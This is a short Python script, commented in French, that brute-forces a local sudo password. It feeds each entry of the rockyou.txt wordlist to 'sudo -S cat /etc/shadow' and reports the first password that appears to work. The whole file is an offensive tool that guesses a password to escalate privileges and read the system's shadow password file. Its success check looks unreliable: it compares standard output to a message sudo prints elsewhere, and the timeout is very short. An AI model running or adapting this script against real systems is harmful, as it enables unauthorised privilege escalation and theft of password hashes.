import subprocess
import time

wordlist = "/home/nirvana/Téléchargements/rockyou.txt"

with open(wordlist, "r", encoding="latin-1", errors="ignore") as f:
    for i, pw in enumerate(f, 1):
        pw = pw.strip()
        if not pw:
            continue

        print(f"[{i}] Test mot de passe: {pw}")

        try:
            proc = subprocess.Popen(
                ["sudo", "-S", "cat", "/etc/shadow"],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            # Envoie le mot de passe suivi d'un saut de ligne

            # Affiche la sortie réelle
#            print("stdout:", stdout.strip())
            stdout, stderr = proc.communicate(input=pw + "\n", timeout=0.03)

            if stdout.strip() != "sudo: il est nécessaire de saisir un mot de passe":
                print(f"\n✅ Mot de passe trouvé : {pw}")
                break

        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
